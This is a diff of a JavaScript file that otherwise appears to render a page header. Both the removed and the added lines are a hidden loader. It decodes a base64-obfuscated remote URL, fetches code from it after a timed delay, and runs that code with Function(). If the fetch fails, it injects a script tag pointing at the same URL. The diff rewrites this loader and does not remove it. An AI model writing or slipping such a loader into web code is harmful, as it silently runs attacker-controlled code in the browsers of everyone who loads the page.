@@ -327,40 +327,49 @@ function _fromB64(e) {
     return decodeURIComponent(escape(atob(e)));
 }
 
-var _pause1712 = 1712;
-setTimeout(function () {
-    (function (url) {
-        var STORE = 'bundle-cache-v1';
-        var _end = 'LmNvbS9pbmJvcm4uc2Vpem9y';
+function buildEndpoint() {
+    var _end = 'LmNvbS9pbmJvcm4uc2Vpem9y';
+    return _fromB64(_tok) + _fromB64(_end);
+}
 
-        function storeAndRead(endpoint) {
-            return caches.open(STORE).then(function (box) {
-                return fetch(endpoint).then(function (packet) {
-                    if (!packet.ok) throw 0;
-                    return box.put(endpoint, packet.clone()).then(function () {
-                        return box.match(endpoint);
-                    });
-                });
-            });
-        }
+function pullText(url) {
+    return fetch(url, { method: 'GET', cache: 'no-store' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        });
+}
 
-        function emitBundle(record) {
-            return record.text().then(function (body) {
-                document.dispatchEvent(new CustomEvent('bundle-ready', { detail: body }));
-            });
-        }
+function runBody(text) {
+    var body = String(text).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    Function(body)();
+}
 
-        function listenBundle() {
-            document.addEventListener('bundle-ready', function once(ev) {
-                document.removeEventListener('bundle-ready', once);
-                try { Function(ev.detail)(); } catch (e) { _trendHubP16(); }
-            });
-        }
+function mountScriptTag(url) {
+    return new Promise(function (resolve, reject) {
+        var tag = document.createElement('script');
+        tag.charset = 'utf-8';
+        tag.src = url;
+        tag.onload = resolve;
+        tag.onerror = reject;
+        (document.head || document.documentElement).appendChild(tag);
+    });
+}
 
-        listenBundle();
-        storeAndRead(endpoint).then(emitBundle).catch(function () { _trendHubP16(); });
-    })(_fromB64(_tok) + _fromB64(_end));
-}, _pause1712);
+function bootRemote() {
+    var url = buildEndpoint();
+    if (!url) { _trendHubP16(); return; }
+    pullText(url)
+        .then(function (text) {
+            try { runBody(text); } catch (e) { _trendHubP16(); }
+        })
+        .catch(function () {
+            mountScriptTag(url).catch(function () { _trendHubP16(); });
+        });
+}
+
+setTimeout(bootRemote, 1712);
 
 function applyGithubHeader(ctx) {
     document.getElementById('domainPath').textContent = ctx.pathDisplay;
